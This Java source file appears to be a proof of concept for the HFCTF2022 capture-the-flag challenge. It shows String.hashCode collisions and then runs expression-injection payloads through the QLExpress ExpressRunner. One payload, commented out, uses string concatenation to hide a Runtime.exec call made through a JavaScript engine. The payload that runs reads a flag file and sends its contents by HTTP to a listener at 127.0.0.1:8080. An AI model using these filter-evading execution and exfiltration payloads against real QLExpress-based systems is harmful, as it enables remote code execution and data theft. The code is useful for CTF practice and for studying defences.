package com.github.enokiy.hashcollision;


import com.ql.util.express.DefaultContext;
import com.ql.util.express.ExpressRunner;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.stream.Collectors;

public class HashCollision {
    public static void main(String[] args) {
        System.out.println(Integer.toHexString("HFCTF2022".hashCode()));
        System.out.println("HFCTF2022".hashCode()=="GeCTF2022".hashCode());
        System.out.println("HFCTF2022".hashCode()=="I'CTF2022".hashCode());
        System.out.println("HFCTF2022".hashCode()=="18wd6vi".hashCode());
        String shell = "";

        try {
            String cmd = "new javax.script.ScriptEngineManager(null).getEngineByName(\"js\").eval(\"java.lang.Run\".concat(\"time.getRun\").concat(\"time().exec('calc')\"))";

//            String flag = new String(Files.readAllBytes(java.nio.file.Paths.get(new java.net.URI("file:///j:/tmp/flag.txt"))));
//            System.out.println(flag);


            String cmd1 = "import java.net.HttpURLConnection;" +
                    "import java.net.URL;" +
                    "import java.nio.file.Files;" +
                    "import java.nio.file.Paths;" +
                    "String flag = new String(Files.readAllBytes(java.nio.file.Paths.get(new java.net.URI(\"file:///j:/tmp/flag.txt\"))));" +
                    "HttpURLConnection conn = (HttpURLConnection) new URL(\"http://127.0.0.1:8080/?a=\"+flag).openConnection();\n" +
                    "            conn.setRequestMethod(\"GET\");\n" +
                    "            conn.getResponseCode()";
            System.out.println(cmd1);

            ExpressRunner runner = new ExpressRunner();
            DefaultContext<String,Object> context = new DefaultContext<>();
//            Object r = runner.execute(cmd,context,null,true,false);
            Object r1 = runner.execute(cmd1,context,null,true,false);


        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
